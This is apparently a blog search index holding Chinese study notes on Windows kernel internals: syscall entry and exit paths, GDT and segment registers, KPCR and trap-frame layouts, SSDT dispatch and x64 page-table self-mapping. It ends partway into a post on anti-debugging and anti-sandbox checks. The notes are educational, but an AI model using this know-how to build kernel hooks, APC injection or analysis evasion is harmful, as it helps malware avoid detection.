<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>windows 学习（四）--被忽略的Basic Knowledge</title>
      <link href="/2025/12/30/2025-12-30-learning_windows_4/"/>
      <url>/2025/12/30/2025-12-30-learning_windows_4/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="basic-knowledge"><a href="#basic-knowledge" class="headerlink" title="basic knowledge"></a>basic knowledge</h2><h3 id="x86下R3-R0"><a href="#x86下R3-R0" class="headerlink" title="x86下R3-&gt;R0"></a>x86下R3-&gt;R0</h3><h4 id="int-2e"><a href="#int-2e" class="headerlink" title="int 2e"></a>int 2e</h4><p>CPU获取 IDT 的基地址，计算目标描述符地址：<code>IDT Base + (0x2e * 8)</code></p><p>进行特权级检查：CPL &lt;&#x3D; DPL</p><ul><li>CPL (Current Privilege Level) ：当前代码段（CS）的特权级（Ring 3）。</li><li>DPL (Descriptor Privilege Level) ：IDT 描述符中规定的特权级（必须是 3，否则用户态无权调用）</li></ul><p>从 IDT 描述符中提取段选择子 Segment Selector 。CPU 使用该 Selector 去查询 GDT</p><p>用户线程栈切换成内核线程栈，保存上下文 (Push Context，会压入一些寄存器)，从IDT（Interrupt Descriptor Table）中寻找0x2e对应的异常处理函数（KiSystemService）进入内核代码空间</p><h4 id="sysenter-sysreturn"><a href="#sysenter-sysreturn" class="headerlink" title="sysenter &#x2F; sysreturn"></a>sysenter &#x2F; sysreturn</h4><p>sysenter指令执行时会跳转到MSR[176]指向的函数地址（该函数实际是KiFastCallEntry），CS、SS、EIP、ESP均来自MSR寄存器，因此速度上比int 2e块（不需要压参数、读内存）</p><p>CS &lt;&#x3D;&#x3D; <code>IA32_SYSENTER_CS</code> (MSR 0x174)。</p><p>EIP &lt;&#x3D;&#x3D; <code>IA32_SYSENTER_EIP</code> (MSR 0x176)。</p><p>ESP &lt;&#x3D;&#x3D; <code>IA32_SYSENTER_ESP</code> (MSR 0x175)。</p><h5 id="KiFastCallEntry的函数流程"><a href="#KiFastCallEntry的函数流程" class="headerlink" title="KiFastCallEntry的函数流程"></a>KiFastCallEntry的函数流程</h5><p> <code>push 30h</code> &#x2F; <code>pop fs</code> FS 寄存器从用户态的  TEB 切换到内核态的 KPCR</p><p>0x30的二进制 ：<code>0000 0000 0011 0000</code></p><p>x86 段选择子的结构：</p><ul><li>RPL (最后2位) : <code>00</code> -&gt; Ring 0 (特权级 0，即内核态)。</li><li>TI (第3位) : <code>0</code> -&gt; GDT (全局描述符表)。</li><li>Index (高13位) : <code>0000000000110</code> -&gt; 6 (十进制)。</li></ul><h6 id="GDT索引表：全局描述表（Global-Description-Table）"><a href="#GDT索引表：全局描述表（Global-Description-Table）" class="headerlink" title="GDT索引表：全局描述表（Global Description Table）"></a>GDT索引表：全局描述表（Global Description Table）</h6><p>在 x86 保护模式 (Protected Mode) 下，内存不再是直接通过物理地址访问，而是通过 “分段 (Segmentation)” 机制访问。</p><ol><li>不直接给地址 ：当程序执行 <code>mov eax, [0x12345678]</code> 时，CPU 并不是直接去物理内存的 <code>0x12345678</code> 拿数据。</li><li>段选择子 (Selector) ：CPU 会先看当前段寄存器（如 <code>DS</code>、<code>CS</code>、<code>SS</code>）里存的  “索引号” （即选择子）。</li><li>查表 (Lookup) ：CPU 根据这个索引号，去 GDT 表里找到对应的  “段描述符 (Descriptor)” 。</li><li>鉴权与定位 ：描述符里记录了这段内存的  基地址 (Base) 、大小 (Limit) 和  权限 (Access Rights) 。只有检查通过，CPU 才会把 基地址 + 偏移量 算出线性地址。</li></ol><table><thead><tr><th>索引 (Index)</th><th>选择子 (Selector)</th><th>名称</th><th>DPL (特权级)</th><th>用途与特征</th></tr></thead><tbody><tr><td>0</td><td>0x00</td><td>NULL</td><td>-</td><td>空描述符 。硬件规定，不可使用。</td></tr><tr><td>1</td><td>0x08</td><td>KGDT_R0_CODE</td><td>0 (内核)</td><td>内核代码段 。Base&#x3D;0, Limit&#x3D;4GB。内核执行代码时 CS&#x3D;0x08。</td></tr><tr><td>2</td><td>0x10</td><td>KGDT_R0_DATA</td><td>0 (内核)</td><td>内核数据段 。Base&#x3D;0, Limit&#x3D;4GB。内核读写数据时 DS&#x2F;ES&#x2F;SS&#x3D;0x10。</td></tr><tr><td>3</td><td>0x1B</td><td>KGDT_R3_CODE</td><td>3 (用户)</td><td>用户代码段 。Base&#x3D;0, Limit&#x3D;4GB。用户程序运行时 CS&#x3D;0x1B (0x18</td></tr><tr><td>4</td><td>0x23</td><td>KGDT_R3_DATA</td><td>3 (用户)</td><td>用户数据段 。Base&#x3D;0, Limit&#x3D;4GB。用户程序运行时 DS&#x2F;ES&#x2F;SS&#x3D;0x23 (0x20</td></tr><tr><td>5</td><td>0x28</td><td>KGDT_TSS</td><td>0 (内核)</td><td>TSS (任务状态段) 。用于保存硬件上下文和栈切换信息 (ESP0)。</td></tr><tr><td>6</td><td>0x30</td><td>KGDT_R0_PCR</td><td>0 (内核)</td><td>内核 KPCR 指针 。 这是唯一的非平坦段 。Base&#x3D;KPCR地址。内核通过 FS 访问 CPU 专属数据。</td></tr><tr><td>7</td><td>0x3B</td><td>KGDT_R3_TEB</td><td>3 (用户)</td><td>用户 TEB 指针 。Base&#x3D;当前线程TEB地址。用户通过 FS 访问线程局部存储。</td></tr><tr><td>…</td><td>…</td><td>…</td><td>…</td><td>(其他保留项，如 LDT, VDM 等)</td></tr></tbody></table><p>LDT：局部描述表（Local Description Table），与GDT功能一致，但不能单独存在，只能嵌套在GDT中。</p><h6 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h6><p>CS (Code Segment) —— 必须指向代码</p><p>CPU 的取指单元（Instruction Fetch Unit）永远只从 <code>CS:EIP</code>（或 <code>CS:RIP</code>）指向的地址读取指令。CS 寄存器的低 2 位（CPL）代表了当前 CPU 的特权级（Ring 0 - Ring 3）。CS 指向 Ring 0 代码段 (0x08) 或 Ring 3 代码段 (0x1B)。</p><p>SS (Stack Segment) —— 必须指向堆栈</p><p>所有的隐式堆栈操作（如 <code>push</code>, <code>pop</code>, <code>call</code>, <code>ret</code>, <code>enter</code>, <code>leave</code>）以及基于 <code>ESP</code>&#x2F;<code>EBP</code> 的内存访问，默认使用 SS 段。SS 指向内核栈段 (0x10) 或用户栈段 (0x23)。</p><p>DS (Data Segment) &amp; ES (Extra Segment)</p><p>DS 是数据访问的默认段（例如 <code>mov eax, [ebx]</code> 默认就是 <code>ds:[ebx]</code>）。ES 是字符串指令（如 <code>movs</code>, <code>stos</code>）的目标段默认值。</p><p>FS &amp; GS (F-Segment &#x2F; G-Segment)</p><table><thead><tr><th>架构</th><th>FS 寄存器用途</th><th>GS 寄存器用途</th><th>为什么不同？</th></tr></thead><tbody><tr><td>x86 (32位)</td><td>指向 TEB (R3) &#x2F; KPCR (R0)</td><td>未大量使用 (通常为0)</td><td>x86下 FS 选择子很早就被分配给了 TEB&#x2F;PCR。</td></tr><tr><td>x64 (64位)</td><td>(兼容性保留，指向 32位TEB)</td><td>指向 TEB (R3) &#x2F; KPCR (R0)</td><td>x64下 CPU 允许 <code>swapgs</code>快速切换 GS，所以主要用 GS。</td></tr></tbody></table><p>fs:[0]：在3环时，该处指向的是TEB结构，0环下指向_KPCR结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KPCR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> <span class="title">NtTib</span>;</span>                                               <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>* <span class="title">Used_ExceptionList</span>;</span>      <span class="comment">//0x0</span></span><br><span class="line">            VOID* Used_StackBase;                                           <span class="comment">//0x4</span></span><br><span class="line">            VOID* Spare2;                                                   <span class="comment">//0x8</span></span><br><span class="line">            VOID* TssCopy;                                                  <span class="comment">//0xc</span></span><br><span class="line">            ULONG ContextSwitches;                                          <span class="comment">//0x10</span></span><br><span class="line">            ULONG SetMemberCopy;                                            <span class="comment">//0x14</span></span><br><span class="line">            VOID* Used_Self;                                                <span class="comment">//0x18</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KPCR</span>* <span class="title">SelfPcr</span>;</span>                                                  <span class="comment">//0x1c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KPRCB</span>* <span class="title">Prcb</span>;</span>                                                    <span class="comment">//0x20</span></span><br><span class="line">    UCHAR Irql;                                                             <span class="comment">//0x24</span></span><br><span class="line">    ULONG IRR;                                                              <span class="comment">//0x28</span></span><br><span class="line">    ULONG IrrActive;                                                        <span class="comment">//0x2c</span></span><br><span class="line">    ULONG IDR;                                                              <span class="comment">//0x30</span></span><br><span class="line">    VOID* KdVersionBlock;                                                   <span class="comment">//0x34</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KIDTENTRY</span>* <span class="title">IDT</span>;</span>                                                 <span class="comment">//0x38</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KGDTENTRY</span>* <span class="title">GDT</span>;</span>                                                 <span class="comment">//0x3c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KTSS</span>* <span class="title">TSS</span>;</span>                                                      <span class="comment">//0x40</span></span><br><span class="line">    USHORT MajorVersion;                                                    <span class="comment">//0x44</span></span><br><span class="line">    USHORT MinorVersion;                                                    <span class="comment">//0x46</span></span><br><span class="line">    ULONG SetMember;                                                        <span class="comment">//0x48</span></span><br><span class="line">    ULONG StallScaleFactor;                                                 <span class="comment">//0x4c</span></span><br><span class="line">    UCHAR SpareUnused;                                                      <span class="comment">//0x50</span></span><br><span class="line">    UCHAR Number;                                                           <span class="comment">//0x51</span></span><br><span class="line">    UCHAR Spare0;                                                           <span class="comment">//0x52</span></span><br><span class="line">    UCHAR SecondLevelCacheAssociativity;                                    <span class="comment">//0x53</span></span><br><span class="line">    ULONG VdmAlert;                                                         <span class="comment">//0x54</span></span><br><span class="line">    ULONG KernelReserved[<span class="number">14</span>];                                               <span class="comment">//0x58</span></span><br><span class="line">    ULONG SecondLevelCacheSize;                                             <span class="comment">//0x90</span></span><br><span class="line">    ULONG HalReserved[<span class="number">16</span>];                                                  <span class="comment">//0x94</span></span><br><span class="line">    ULONG InterruptMode;                                                    <span class="comment">//0xd4</span></span><br><span class="line">    UCHAR Spare1;                                                           <span class="comment">//0xd8</span></span><br><span class="line">    ULONG KernelReserved2[<span class="number">17</span>];                                              <span class="comment">//0xdc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KPRCB</span> <span class="title">PrcbData</span>;</span>                                                 <span class="comment">//0x120</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p> <code>mov ecx, fs:_KPCR.TSS</code>：通过 FS (KPCR) 获取当前任务状态段 (TSS)。</p><p><code>mov esp, [ecx+_KTSS.Esp0]</code>：栈指针切换到该线程真正的内核栈顶</p><p>后续是根据 <code>KTrap_Frame</code>的结构构建完整 <code>Trap Frame</code> 与异常链表，需要注意的是用户态的 <code>esp</code>是通过 <code>push edx</code>来压入的，因为 <code>sysenter</code>被封装成了 <code>KiFastSystemCall</code>函数，会先进行 <code>mov edx,esp;</code>然后再 <code>sysenter</code>，eip则是 <code>_KUSER_SHARED_DATA</code>中的 <code>SystemCallReturn</code> 地址</p><p><code>mov ebx, large fs:KPCR.SelfPcr</code>：获取 PCR 指针，<code>push dword ptr [ebx]</code>：保存当前的异常处理链表头 (<code>PCR.ExceptionList</code>) 到栈</p><p>最后保存到_KTHREAD.TrapFrame中</p><p>KTrap_Frame：栈帧，用来保存R3切换到R0的环境</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8c bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KTRAP_FRAME</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG DbgEbp;                                                           <span class="comment">//0x0</span></span><br><span class="line">    ULONG DbgEip;                                                           <span class="comment">//0x4</span></span><br><span class="line">    ULONG DbgArgMark;                                                       <span class="comment">//0x8</span></span><br><span class="line">    ULONG DbgArgPointer;                                                    <span class="comment">//0xc</span></span><br><span class="line">    USHORT TempSegCs;                                                       <span class="comment">//0x10</span></span><br><span class="line">    UCHAR Logging;                                                          <span class="comment">//0x12</span></span><br><span class="line">    UCHAR Reserved;                                                         <span class="comment">//0x13</span></span><br><span class="line">    ULONG TempEsp;                                                          <span class="comment">//0x14</span></span><br><span class="line">    ULONG Dr0;                                                              <span class="comment">//0x18</span></span><br><span class="line">    ULONG Dr1;                                                              <span class="comment">//0x1c</span></span><br><span class="line">    ULONG Dr2;                                                              <span class="comment">//0x20</span></span><br><span class="line">    ULONG Dr3;                                                              <span class="comment">//0x24</span></span><br><span class="line">    ULONG Dr6;                                                              <span class="comment">//0x28</span></span><br><span class="line">    ULONG Dr7;                                                              <span class="comment">//0x2c</span></span><br><span class="line">    ULONG SegGs;                                                            <span class="comment">//0x30</span></span><br><span class="line">    ULONG SegEs;                                                            <span class="comment">//0x34</span></span><br><span class="line">    ULONG SegDs;                                                            <span class="comment">//0x38</span></span><br><span class="line">    ULONG Edx;                                                              <span class="comment">//0x3c</span></span><br><span class="line">    ULONG Ecx;                                                              <span class="comment">//0x40</span></span><br><span class="line">    ULONG Eax;                                                              <span class="comment">//0x44</span></span><br><span class="line">    ULONG PreviousPreviousMode;                                             <span class="comment">//0x48-----R0用</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>* <span class="title">ExceptionList</span>;</span>                   <span class="comment">//0x4c</span></span><br><span class="line">    ULONG SegFs;                                                            <span class="comment">//0x50</span></span><br><span class="line">    ULONG Edi;                                                              <span class="comment">//0x54</span></span><br><span class="line">    ULONG Esi;                                                              <span class="comment">//0x58</span></span><br><span class="line">    ULONG Ebx;                                                              <span class="comment">//0x5c</span></span><br><span class="line">    ULONG Ebp;                                                              <span class="comment">//0x60</span></span><br><span class="line">    ULONG ErrCode;                                                          <span class="comment">//0x64</span></span><br><span class="line">    ULONG Eip;                                                              <span class="comment">//0x68</span></span><br><span class="line">    ULONG SegCs;                                                            <span class="comment">//0x6c </span></span><br><span class="line">    ULONG EFlags;                                                           <span class="comment">//0x70-----R3用</span></span><br><span class="line">    ULONG HardwareEsp;                                                      <span class="comment">//0x74 </span></span><br><span class="line">    ULONG HardwareSegSs;                                                    <span class="comment">//0x78</span></span><br><span class="line">    ULONG V86Es;                                                            <span class="comment">//0x7c虚拟8086模式下，保护模式下不用</span></span><br><span class="line">    ULONG V86Ds;                                                            <span class="comment">//0x80</span></span><br><span class="line">    ULONG V86Fs;                                                            <span class="comment">//0x84</span></span><br><span class="line">    ULONG V86Gs;                                                            <span class="comment">//0x88</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>确定系统服务表（SSDT vs Shadow SSDT）</p><p><code>mov edi, eax</code> &#x2F; <code>shr edi, 8</code> &#x2F; <code>and edi, 10h</code></p><p>Windows 系统调用号第 12 位（bit 12）用于区分表。</p><ul><li>如果 ID &lt; 0x1000，<code>edi</code> 结果为 0 -&gt; 使用 KeServiceDescriptorTable (核心内核函数)。</li><li>如果 ID &gt;&#x3D; 0x1000 (如 0x1xxx)，<code>edi</code> 结果为 0x10 -&gt; 使用 KeServiceDescriptorTableShadow (win32k.sys 图形&#x2F;窗口函数)。</li></ul><p><code>add edi, [esi+_KTHREAD.ServiceTable]</code> _KTHREAD中有服务表的基址，现在edi指向了正确的 Service Descriptor Table 结构体</p><p>获取 SSDT 参数表 (Argument Table) 的基址，获取 SSDT 函数地址表 (Service Table) 的基址。</p><p>从参数表中读取该系统调用需要的参数字节数 ，从函数表中读取目标内核函数地址 —-计算公式：表基址 + (调用号 * 4)。</p><p>通过 <code>rep movsd</code>从用户态堆栈完整拷贝到内核态堆栈（此时ECX–参数个数；ESI–由EDX赋予，EDX在sysenter前就指向old esp；   EDI–内核栈地址），最后 <code>call ebx</code>调用内核函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLKSERVICE_TABLE_DESCRIPTORE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PULONG_PTR FuncPoint;<span class="comment">//指向函数表</span></span><br><span class="line">    PULONG Count;<span class="comment">//调用的次数</span></span><br><span class="line">    PULONG Limit;<span class="comment">//函数个数</span></span><br><span class="line">    PUCHAR ArgsPoint;<span class="comment">//参数列表</span></span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUMBER_SERVICE_TABLES 2</span></span><br><span class="line"> </span><br><span class="line">KSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable[NUMBER_SERVICE_TABLES]</span><br><span class="line">KSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTableShadow[NUMBER_SERVICE_TABLES]</span><br></pre></td></tr></table></figure><p><img src="/image/2025-12-30-learning_windows_4/1767091367705.png" alt="1767091367705"></p><p>x64下 <code>syscall</code>似乎和x86下的 <code>sysenter</code>差不多，跳转的内核函数是 <code>KiSystemCall64</code></p><h3 id="x86下R0-R3"><a href="#x86下R0-R3" class="headerlink" title="x86下R0-&gt;R3"></a>x86下R0-&gt;R3</h3><p>处理APC：代码读取 <code>KPCR-&gt;CurrentThread</code> (<code>fs:124h</code>)</p><p>检查 <code>Thread-&gt;ApcState.UserApcPending</code>，如果有用户态的 APC（比如某些 I&#x2F;O 完成回调、线程挂起请求）， 需要先处理掉（APC注入的发生点）<code>call _KiDeliverApc</code>直到所有挂起的 APC都执行完毕。</p><p>恢复异常链表及调试寄存器（如果为调试模式的话）：从 TrapFrame 中取出用户态的 <code>ExceptionList</code>，写回 <code>fs:[0]</code> (KPCR的第一个成员指向TEB )，</p><p>检查 <code>TrapFrame-&gt;Dr7</code>。如果用户态程序下了硬件断点（Hardware Breakpoint），这里需要恢复调试寄存器 <code>DR0</code>-<code>DR7</code>。</p><p>恢复通用寄存器与栈调整，将ESP移动到TrapFrame-&gt;SegFs，<code>pop fs</code>恢复3环FS，再移动esp恢复各个通用寄存器，执行iret返回用户态自动从栈上弹出 EIP, CS, EFLAGS, ESP, SS</p><h3 id="x64页表自映射"><a href="#x64页表自映射" class="headerlink" title="x64页表自映射"></a>x64页表自映射</h3><p>x64 使用 4 级页表（PML4, PDPT, PDE, PTE）</p><p>当内核需要修改某个虚拟地址（比如 <code>0x12345678</code>）对应的 PTE（页表项）属性时，它不能直接去写物理内存。它必须先把存放这个 PTE 的物理页映射到一个虚拟地址上，才能通过 CPU指令（如 <code>mov</code>）去修改它。</p><p>如果没有自映射，内核每次修改页表都需要临时分配虚拟地址、映射物理页、修改、解除映射，这非常繁琐且低效。</p><p><img src="/image/2025-12-30-learning_windows_4/1767171485680.png" alt="1767171485680"></p><p>使用windbg命令 <code>!pte</code>查看 <code>0</code>地址数据</p><p>对pml4、pdpt、pde、pte四项的页表基址进行拆分得到如下（去除 <code>页内偏移</code>和 <code>高16位</code>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pte_base：   111010111 000000000 000000000 000000000（FEB8000000）</span><br><span class="line">pde_base：   111010111 111010111 000000000 000000000（FEBF5C0000）</span><br><span class="line">pdpte_base： 111010111 111010111 111010111 000000000（FEBF5FAE00）</span><br><span class="line">pml4_base：  111010111 111010111 111010111 111010111（FEBF5FAFD7）</span><br></pre></td></tr></table></figure><p><img src="/image/2025-12-30-learning_windows_4/1767171602190.png" alt="1767171602190"></p><p>CPU是如何找到一个虚拟地址的物理地址的：</p><p>CPU先从CR3寄存器读取到PML4表的物理地址，从cr3+虚拟地址的最高9位 * 8处获得PDPT的物理地址，然后这个地址+虚拟地址的次高9位 * 8获得的地址是PDE的物理地址，以此类推从PTE上获取物理页帧号，物理地址&#x3D; <code>(PFN &lt;&lt; 12) + Offset(0x000)</code> 最后去内存条里找到数据</p><p>但如果是查找PTE表的物理地址呢？这里就和虚表自映射有关了，在cr3+PTE表虚拟地址最高9位*8处获得的地址其实是PML4的地址</p><p>在windbg上通过!pte命令获得的地址，实际上CPU从这些虚拟地址访问到的物理地址就是他们本身，这也解释了这些虚拟地址为什么要这样设计。</p><p>PTE表：在 x64 下，一个 PTE 是 64位（8字节）的，它里面存了物理地址和属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_MMPTE_HARDWARE</span><br><span class="line">   +0x000 Valid            : Pos 0, 1 Bit</span><br><span class="line">   +0x000 Dirty1           : Pos 1, 1 Bit</span><br><span class="line">   +0x000 Owner            : Pos 2, 1 Bit</span><br><span class="line">   +0x000 WriteThrough     : Pos 3, 1 Bit</span><br><span class="line">   +0x000 CacheDisable     : Pos 4, 1 Bit</span><br><span class="line">   +0x000 Accessed         : Pos 5, 1 Bit</span><br><span class="line">   +0x000 Dirty            : Pos 6, 1 Bit</span><br><span class="line">   +0x000 LargePage        : Pos 7, 1 Bit</span><br><span class="line">   +0x000 Global           : Pos 8, 1 Bit</span><br><span class="line">   +0x000 CopyOnWrite      : Pos 9, 1 Bit</span><br><span class="line">   +0x000 Unused           : Pos 10, 1 Bit</span><br><span class="line">   +0x000 Write            : Pos 11, 1 Bit</span><br><span class="line">   +0x000 PageFrameNumber  : Pos 12, 36 Bits</span><br><span class="line">   +0x000 ReservedForHardware : Pos 48, 4 Bits</span><br><span class="line">   +0x000 ReservedForSoftware : Pos 52, 4 Bits</span><br><span class="line">   +0x000 WsleAge          : Pos 56, 4 Bits</span><br><span class="line">   +0x000 WsleProtection   : Pos 60, 3 Bits</span><br><span class="line">   +0x000 NoExecute        : Pos 63, 1 Bit</span><br></pre></td></tr></table></figure><table><thead><tr><th>位 (Bit)</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>63(最高位)</td><td>NX (No-Execute)</td><td>1&#x3D;禁止执行 , 0&#x3D;允许执行</td></tr><tr><td>12-62</td><td>PFN</td><td>物理页帧号 (实际物理地址)</td></tr><tr><td>2</td><td>U&#x2F;S (User&#x2F;Supervisor)</td><td>0&#x3D;内核页, 1&#x3D;用户页</td></tr><tr><td>1</td><td>R&#x2F;W (Read&#x2F;Write)</td><td>1&#x3D;可写, 0&#x3D;只读</td></tr><tr><td>0</td><td>P (Present)</td><td>1&#x3D;页面有效 , 0&#x3D;无效</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 学习（五）-- 反调试和反沙箱</title>
      <link href="/2025/12/30/2025-12-31-leaning_windows_5/"/>
      <url>/2025/12/30/2025-12-31-leaning_windows_5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><h3 id="PEB标志位检测"><a href="#PEB标志位检测" class="headerlink" title="PEB标志位检测"></a>PEB标志位检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _PEB</span><br><span class="line">ntdll!_PEB</span><br><span class="line">   +0x000 InheritedAddressSpace : UChar</span><br><span class="line">   +0x001 ReadImageFileExecOptions : UChar</span><br><span class="line">   +0x002 BeingDebugged    : UChar</span><br><span class="line">   +0x003 BitField         : UChar</span><br><span class="line">   +0x003 ImageUsesLargePages : Pos 0, 1 Bit</span><br><span class="line">   +0x003 IsProtectedProcess : Pos 1, 1 Bit</span><br><span class="line">   +0x003 IsLegacyProcess  : Pos 2, 1 Bit</span><br><span class="line">   +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit</span><br><span class="line">   +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit</span><br><span class="line">   +0x003 SpareBits        : Pos 5, 3 Bits</span><br><span class="line">   +0x004 Mutant           : Ptr32 Void</span><br><span class="line">   +0x008 ImageBaseAddress : Ptr32 Void</span><br><span class="line">   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA</span><br><span class="line">   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">   +0x014 